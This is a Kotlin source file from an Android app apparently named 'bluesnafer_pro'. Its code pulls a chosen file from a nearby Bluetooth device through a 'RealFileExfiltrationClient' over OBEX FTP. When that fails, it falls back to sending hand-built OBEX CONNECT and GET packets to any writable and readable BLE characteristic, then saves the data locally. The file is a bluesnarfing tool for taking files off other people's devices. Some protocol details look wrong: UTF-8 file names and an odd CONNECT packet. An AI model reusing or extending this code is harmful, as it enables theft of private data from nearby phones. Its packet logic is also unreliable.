package com.bluesnafer_pro

import android.bluetooth.*
import android.content.Context
import android.util.Log
import java.io.*
import java.util.*
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/**
 * Transferencia de archivos: RFCOMM OBEX FTP primario, BLE GATT como fallback.
 * El UUID 00001106 es perfil clásico (RFCOMM), no GATT.
 */
object ObexBleTransfer {
    private val OBEX_FTP_UUID = UUID.fromString("00001106-0000-1000-8000-00805F9B34FB")
    private const val TAG = "ObexBleTransfer"

    fun transferFileViaBle(context: Context, device: BluetoothDevice, remoteFilePath: String): Map<String, Any> {
        Log.d(TAG, "Transfer request: $remoteFilePath -> ${device.address}")

        RealFileExfiltrationClient.init(context)
        val rfcommResult = RealFileExfiltrationClient.downloadRemoteFile(device, remoteFilePath)
        if (rfcommResult["success"] == true) {
            return rfcommResult + mapOf("method" to "RFCOMM_OBEX_FTP")
        }

        Log.d(TAG, "RFCOMM failed (${rfcommResult["error"]}), trying BLE GATT fallback...")
        val bleResult = transferViaGatt(context, device, remoteFilePath)
        return if (bleResult["success"] == true) {
            bleResult + mapOf("method" to "BLE_GATT_FALLBACK", "rfcommError" to (rfcommResult["error"] ?: ""))
        } else {
            mapOf(
                "success" to false,
                "error" to "RFCOMM: ${rfcommResult["error"]}; BLE: ${bleResult["error"]}",
                "rfcommAttempt" to rfcommResult,
                "bleAttempt" to bleResult
            )
        }
    }

    /**
     * Fallback BLE: busca servicios GATT con características write+notify
     * (no usa UUIDs RFCOMM en GATT).
     */
    private fun transferViaGatt(context: Context, device: BluetoothDevice, remoteFilePath: String): Map<String, Any> {
        val latch = CountDownLatch(1)
        var result: Map<String, Any> = mapOf("success" to false, "error" to "Timeout")
        var gatt: BluetoothGatt? = null
        val receivedData = ByteArrayOutputStream()
        val fileName = remoteFilePath.substringAfterLast('/').ifEmpty { "unknown" }

        try {
            val callback = object : BluetoothGattCallback() {
                private var targetChar: BluetoothGattCharacteristic? = null

                override fun onConnectionStateChange(g: BluetoothGatt, status: Int, newState: Int) {
                    if (newState == BluetoothProfile.STATE_CONNECTED) {
                        g.discoverServices()
                    } else if (newState == BluetoothProfile.STATE_DISCONNECTED) {
                        latch.countDown()
                    }
                }

                override fun onServicesDiscovered(g: BluetoothGatt, status: Int) {
                    if (status != BluetoothGatt.GATT_SUCCESS) {
                        result = mapOf("success" to false, "error" to "GATT discovery failed: $status")
                        latch.countDown()
                        return
                    }

                    targetChar = findTransferCharacteristic(g)
                    if (targetChar == null) {
                        result = mapOf("success" to false, "error" to "No BLE transfer characteristic found")
                        latch.countDown()
                        return
                    }

                    val connectPkt = byteArrayOf(0x80.toByte(), 0x00, 0x07, 0x10, 0x00, 0x01, 0x00)
                    targetChar!!.writeType = BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT
                    targetChar!!.value = connectPkt
                    g.writeCharacteristic(targetChar)
                }

                override fun onCharacteristicWrite(g: BluetoothGatt, c: BluetoothGattCharacteristic, status: Int) {
                    if (status != BluetoothGatt.GATT_SUCCESS || c != targetChar) {
                        result = mapOf("success" to false, "error" to "GATT write failed: $status")
                        latch.countDown()
                        return
                    }

                    if (receivedData.size() == 0) {
                        g.readCharacteristic(c)
                    } else {
                        val saved = saveAndFinish(context, fileName, receivedData.toByteArray())
                        result = if (saved != null && receivedData.size() > 0) {
                            buildSuccess(fileName, receivedData.size(), saved.absolutePath)
                        } else {
                            mapOf("success" to false, "error" to "BLE GATT: fallo al guardar archivo")
                        }
                        latch.countDown()
                    }
                }

                override fun onCharacteristicRead(g: BluetoothGatt, c: BluetoothGattCharacteristic, status: Int) {
                    if (status != BluetoothGatt.GATT_SUCCESS || c != targetChar) {
                        result = mapOf("success" to false, "error" to "GATT read failed: $status")
                        latch.countDown()
                        return
                    }

                    val response = c.value ?: ByteArray(0)
                    if (response.isEmpty()) {
                        result = mapOf("success" to false, "error" to "Empty GATT response")
                        latch.countDown()
                        return
                    }

                    when (response[0].toInt() and 0xFF) {
                        0xA0 -> sendGetRequest(g, c, remoteFilePath)
                        0x90, 0xA1 -> {
                            if (response.size > 3) receivedData.write(response, 3, response.size - 3)
                            if ((response[0].toInt() and 0xFF) == 0x90) {
                                val saved = saveAndFinish(context, fileName, receivedData.toByteArray())
                                result = if (saved != null && receivedData.size() > 0) {
                                    buildSuccess(fileName, receivedData.size(), saved.absolutePath)
                                } else {
                                    mapOf("success" to false, "error" to "BLE GATT: fallo al guardar archivo")
                                }
                                latch.countDown()
                            } else {
                                g.readCharacteristic(c)
                            }
                        }
                        else -> {
                            if (response.size > 3) receivedData.write(response, 3, response.size - 3)
                            g.readCharacteristic(c)
                        }
                    }
                }
            }

            gatt = device.connectGatt(context, false, callback)
            latch.await(30, TimeUnit.SECONDS)
            return result
        } catch (e: Exception) {
            Log.e(TAG, "BLE GATT transfer error", e)
            return mapOf("success" to false, "error" to (e.message ?: "unknown error"))
        } finally {
            try { gatt?.close() } catch (_: Exception) {}
        }
    }

    private fun findTransferCharacteristic(gatt: BluetoothGatt): BluetoothGattCharacteristic? {
        for (service in gatt.services) {
            val uuid = service.uuid.toString().lowercase()
            if (uuid.contains("00001106") || uuid.contains("00001133")) continue

            for (char in service.characteristics) {
                val canWrite = (char.properties and BluetoothGattCharacteristic.PROPERTY_WRITE) != 0 ||
                    (char.properties and BluetoothGattCharacteristic.PROPERTY_WRITE_NO_RESPONSE) != 0
                val canRead = (char.properties and BluetoothGattCharacteristic.PROPERTY_READ) != 0
                if (canWrite && canRead) return char
            }
        }
        return null
    }

    private fun sendGetRequest(gatt: BluetoothGatt, characteristic: BluetoothGattCharacteristic, filePath: String) {
        val fileName = filePath.substringAfterLast('/')
        val nameBytes = fileName.toByteArray(Charsets.UTF_8)
        val pktSize = 7 + nameBytes.size
        val getPkt = ByteArray(pktSize)
        getPkt[0] = 0x83.toByte()
        getPkt[1] = (pktSize ushr 8).toByte()
        getPkt[2] = (pktSize and 0xFF).toByte()
        getPkt[3] = 0x01
        getPkt[4] = ((nameBytes.size + 3) ushr 8).toByte()
        getPkt[5] = ((nameBytes.size + 3) and 0xFF).toByte()
        getPkt[6] = 0x00
        System.arraycopy(nameBytes, 0, getPkt, 7, nameBytes.size)

        characteristic.writeType = BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT
        characteristic.value = getPkt
        gatt.writeCharacteristic(characteristic)
    }

    private fun saveAndFinish(context: Context, fileName: String, data: ByteArray): File? {
        return try {
            val dir = context.getExternalFilesDir("obex_ble") ?: context.filesDir
            dir.mkdirs()
            val file = File(dir, fileName)
            FileOutputStream(file).use { it.write(data) }
            Log.d(TAG, "File saved: ${file.absolutePath} (${data.size} bytes)")
            file
        } catch (e: Exception) {
            Log.e(TAG, "Error saving file", e)
            null
        }
    }

    private fun buildSuccess(fileName: String, size: Int, absolutePath: String): Map<String, Any> = mapOf(
        "success" to (size > 0),
        "file" to fileName,
        "size" to size,
        "path" to absolutePath
    )
}